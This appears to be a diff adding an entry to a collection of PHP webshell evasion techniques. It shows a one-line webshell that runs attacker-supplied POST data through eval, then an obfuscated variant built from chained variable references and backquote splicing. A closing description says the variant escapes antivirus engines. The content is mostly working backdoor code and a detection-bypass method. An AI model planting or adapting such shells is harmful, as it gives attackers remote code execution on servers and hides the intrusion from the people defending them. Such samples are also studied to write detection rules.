@@ -1,0 +1,20 @@
+Original webshell sample:
+
+'''
+<?php @eval($_POST['q']);?>
+'''
+
+Webshell obtained after using the corresponding method:
+
+'''
+<?php
+$b = &$a;
+$a = $_POST['q'];
+$c = &$b;
+eval(`/**123**/`.$c);
+?>
+'''
+
+Description:
+
+This method escapes the antivirus engine by using "&" multiple times to reference the previous variable, and then passing what is to be executed into the "eval" function through a series of assignments spliced with backquotes.
